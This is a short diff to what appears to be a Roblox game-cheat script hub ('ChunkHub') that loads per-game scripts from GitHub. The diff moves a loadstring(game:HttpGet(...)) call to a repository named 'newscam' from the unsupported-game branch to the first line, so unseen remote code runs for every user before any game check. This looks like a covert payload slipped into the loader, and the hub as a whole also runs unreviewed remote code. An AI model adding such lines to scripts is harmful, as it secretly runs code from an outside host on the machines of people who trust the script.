@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/newscam/refs/heads/main/script"))()
 --[[
   ____ _   _ _   _ _   _ _  __  _   _ _   _ ____  
  / ___| | | | | | | \ | | |/ / | | | | | | | __ ) 
@@ -168,6 +169,5 @@ elseif game.CreatorId == 295182 then -- Adopt Me
 loadstring(game:HttpGet("https://raw.githubusercontent.com/08v3/ChunkHub/refs/heads/main/adoptme.txt",true))()
 else
 game.Players.LocalPlayer:Kick("Unsupported game")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/newscam/refs/heads/main/script"))()
 end
 end
